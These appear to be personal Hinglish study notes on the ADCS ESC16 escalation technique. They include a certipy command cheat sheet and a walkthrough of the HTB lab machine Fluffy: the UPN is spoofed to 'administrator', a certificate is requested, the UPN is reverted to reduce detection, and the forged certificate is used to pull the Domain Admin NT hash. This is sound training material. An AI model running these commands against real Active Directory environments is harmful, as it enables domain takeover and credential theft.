# ADCS ESC16 — CA Security Extension Disabled (Hinglish Notes)

**Category:** ADCS Escalation
**CPTS Module:** Attacking Active Directory Certificate Services (ADCS)

## Concept samjho

Normally jab bhi ek CA (Certificate Authority) koi certificate issue karta hai, wo usme ek extension daalta hai — `szOID_NTDS_CA_SECURITY_EXT` — jo us certificate ko requester ke SID se cryptographically bind kar deta hai. **ESC16** tab hoti hai jab CA-wide level pe ye extension **disable** hota hai.

Agar ye extension disable hai, to certificate ki identity sirf **request karte waqt account ka UPN kya tha** — usi pe trust ho jaati hai. Aur UPN to tum khud change kar sakte ho agar tumhare paas thoda bhi access hai!

**Attack ka idea:**
1. Apne controlled account ka UPN temporarily change karo kisi privileged account jaisa (jaise `administrator`).
2. Certificate request karo — CA us spoofed UPN pe trust karke certificate de dega.
3. UPN wapas original pe revert kar do (taaki real account break na ho, aur detection kam ho).
4. Us forged certificate se PKINIT/Schannel ke through authenticate karo — ab tum us impersonated identity ke naam se authenticated ho, aur uska NT hash nikal sakte ho.

## Tools ka roster

| Tool | Kaam | Type |
|---|---|---|
| `certipy-ad` | Vulnerable CA dhoondho, UPN manage karo, cert request karo, cert se auth karo | Attack/Exploit |
| `Certify` (C#) | Windows-native ADCS enum/exploit tool | Attack/Exploit |

## Commands — cheat sheet

```bash
# 1. CA mein ESC misconfigs check karo (ESC16 samet)
certipy find -u '<user>@<domain>' -p '<password>' -dc-ip '<dc_ip>' -vulnerable
# ya hash se:
certipy find -username '<user>' -hashes ':<nt_hash>' -dc-ip '<dc_ip>' -vulnerable

# 2. Target account ka UPN badal do privileged identity jaisa
certipy account -u '<user>@<domain>' -p '<password>' -dc-ip '<dc_ip>' \
  -upn '<privileged_upn>' -user '<controlled_account>' update

# 3. Naye (impersonated) UPN se certificate request karo
certipy req -k -dc-ip '<dc_ip>' -target '<dc_hostname>' \
  -ca '<ca_name>' -template 'User'

# 4. UPN wapas original pe revert karo
certipy account -u '<user>@<domain>' -p '<password>' -dc-ip '<dc_ip>' \
  -upn '<original_upn>@<domain>' -user '<controlled_account>' update

# 5. Forged certificate se authenticate karo aur impersonated identity ka NT hash lo
certipy auth -dc-ip '<dc_ip>' -pfx '<file>.pfx' -username '<impersonated_user>' -domain '<domain>'
```

## Practical Example — Fluffy (HTB) se seedha

`ca_svc` ka NT hash pehle se mil chuka tha (poori chain se — dekho `Shadow-Credentials-Attack.md`). CA ko enumerate kiya:

```bash
certipy find -username ca_svc -hashes ':<ca_svc_hash>' -dc-ip 10.10.11.69 -vulnerable
```
Confirm hua ki CA pe **ESC16** vulnerability hai.

**Step 1 — `ca_svc` ka UPN `administrator` bana diya:**
```bash
certipy account -u 'p.agila@fluffy.htb' -p 'promXXXXXXXXXXX' -dc-ip '10.10.11.69' \
  -upn 'administrator' -user 'ca_svc' update
```
*Screenshot reference: `htb_fluffy_ca_svc_admin_perm.png`.*

**Step 2 — Ab impersonated `administrator` ke naam se certificate maanga:**
```bash
certipy req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' \
  -ca 'fluffy-DC01-CA' -template 'User'
```
*Screenshot reference: `htb_fluffy_adminpfx.png` — `administrator.pfx` certificate mil gaya.*

**Step 3 — `ca_svc` ka UPN wapas original pe revert kiya:**
```bash
certipy account -u 'p.agila@fluffy.htb' -p 'promXXXXXXXXXXX' -dc-ip '10.10.11.69' \
  -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
```
*Screenshot reference: `htb_fluffy_casvcNT.png`.*

**Step 4 — Forged cert se authenticate karke Administrator ka NT hash nikala:**
```bash
certipy auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
```
*Screenshot reference: `htb_fluffy_admin_hash.png` — Domain Administrator ka NT hash mil gaya.*

**Result:** Full domain compromise ho gaya — `root.txt` mil gaya.

**Yaad rakhna:** ESC16 hi final escalation step tha jisne ek service-account foothold ko poore Domain Admin mein convert kar diya — bas CA/UPN manipulation se, koi password cracking involve nahi hui.
